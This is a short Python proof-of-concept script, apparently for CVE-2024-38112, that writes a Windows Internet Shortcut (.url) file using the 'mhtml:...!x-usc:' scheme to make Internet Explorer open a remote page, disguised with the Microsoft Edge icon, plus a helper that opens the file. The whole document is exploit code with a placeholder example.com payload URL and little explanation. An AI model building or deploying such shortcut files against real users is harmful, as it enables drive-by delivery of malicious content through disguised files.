import os

def create_malicious_url_file():
    content = """
[InternetShortcut]
URL=mhtml:http://example.com/malicious_page.html!x-usc:http://example.com/malicious_page.html
IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
IconIndex=1
    """
    filename = "CVE-2024-38112_Demo.url"
    with open(filename, "w") as file:
        file.write(content)
    print(f"Malicious .url file created: {filename}")

def simulate_user_action():
    try:
        os.startfile("CVE-2024-38112_Demo.url")
        print("Attempted to open the malicious .url file.")
    except Exception as e:
        print(f"Error: {str(e)}")

def main():
    create_malicious_url_file()

if __name__ == "__main__":
    main()